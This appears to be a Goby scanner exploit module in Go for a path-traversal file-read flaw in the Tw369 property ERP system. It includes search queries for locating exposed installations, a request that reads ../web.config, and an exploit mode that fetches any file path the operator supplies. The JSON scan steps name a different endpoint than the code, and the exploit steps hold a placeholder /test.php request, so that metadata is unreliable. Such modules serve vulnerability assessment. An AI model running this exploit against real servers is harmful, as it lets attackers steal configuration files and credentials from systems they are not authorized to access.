package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Tw369 ERP VacantDiscountDownLoad File Read Vulnerability",
    "Description": "<p>Based on software development and technical services, Tw369 Internet Technology Co., Ltd. has established a property ERP application system to provide property management companies with intelligent property management overall solutions aimed at reducing costs, ensuring quality and improving efficiency, so as to realize the management upgrade of property management companies. Based on the platform construction and resource integration, the community O2O service platform is established to provide property management companies with a smart community comprehensive service platform aimed at improving services, facilitating owners and increasing profits, so as to realize the service transformation of property management companies. </p><p>The VacantDiscountDownLoad interface of the ERP system of Tw369 Property has any file reading vulnerability, which allows attackers to read any file or directory content on the server, which will cause harm.</p>",
    "Product": "Tw369 ERP System",
    "Homepage": "http://www.tw369.com/",
    "DisclosureDate": "2024-08-05",
    "PostTime": "2024-08-08",
    "Author": "hhh3156",
    "FofaQuery": "(body=\"WebOffice.rar\" || body=\"Jscript-Ui\") && (body=\"天问物业ERP系统\" || body=\"国家版权局软著登字第1205328号\" || body=\"/HM/M_Main/frame/sso.aspx\")",
    "GobyQuery": "(body=\"WebOffice.rar\" || body=\"Jscript-Ui\") && (body=\"天问物业ERP系统\" || body=\"国家版权局软著登字第1205328号\" || body=\"/HM/M_Main/frame/sso.aspx\")",
    "Level": "1",
    "Impact": "<p>The VacantDiscountDownLoad interface of the ERP system of Tw369 Property has any file reading vulnerability, which allows attackers to read any file or directory content on the server, which will cause harm.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.tw369.com/\">http://www.tw369.com/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.config,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "天问物业ERP系统 VacantDiscountDownLoad 文件读取漏洞",
            "Product": "天问物业ERP系统",
            "Description": "<p>天问互联科技有限公司以软件开发和技术服务为基础，建立物业ERP应用系统，向物管公司提供旨在降低成本、保障品质、提升效能为目标的智慧物管整体解决方案，实现物管公司的管理升级；以平台搭建和资源整合为基础，建立社区O2O服务平台，向物管公司提供旨在完善服务、方便业主、增加收益为目标的智慧小区综合服务平台，实现物业公司的服务转型。</p><p>天问物业ERP系统，其VacantDiscountDownLoad&nbsp;接口存在任意文件读取漏洞，允许攻击者读取服务器上任意文件或目录内容，会造成危害。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.tw369.com/\">http://www.tw369.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>天问物业ERP系统，其VacantDiscountDownLoad&nbsp;接口存在任意文件读取漏洞，允许攻击者读取服务器上任意文件或目录内容，会造成危害。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Tw369 ERP VacantDiscountDownLoad File Read Vulnerability",
            "Product": "Tw369 ERP System",
            "Description": "<p>Based on software development and technical services, Tw369 Internet Technology Co., Ltd. has established a property ERP application system to provide property management companies with intelligent property management overall solutions aimed at reducing costs, ensuring quality and improving efficiency, so as to realize the management upgrade of property management companies. Based on the platform construction and resource integration, the community O2O service platform is established to provide property management companies with a smart community comprehensive service platform aimed at improving services, facilitating owners and increasing profits, so as to realize the service transformation of property management companies.&nbsp;</p><p>The VacantDiscountDownLoad interface of the ERP system of Tw369 Property has any file reading vulnerability, which allows attackers to read any file or directory content on the server, which will cause harm.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.tw369.com/\">http://www.tw369.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The VacantDiscountDownLoad interface of the ERP system of Tw369 Property has any file reading vulnerability, which allows attackers to read any file or directory content on the server, which will cause harm.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9922"
}`

	postOrGet_qlkUYTRCVVV93v58apakAUUVmn02 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		path := "/HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile=" + fileUrl
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
		}
		resp, err := setGetRequest(hostInfo, path, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile=../web.config"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../web.config": "<configuration>"}
			// 函数继承
			uploadFileFunc := postOrGet_qlkUYTRCVVV93v58apakAUUVmn02

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.config": {"../web.config", "<configuration>"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_qlkUYTRCVVV93v58apakAUUVmn02

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
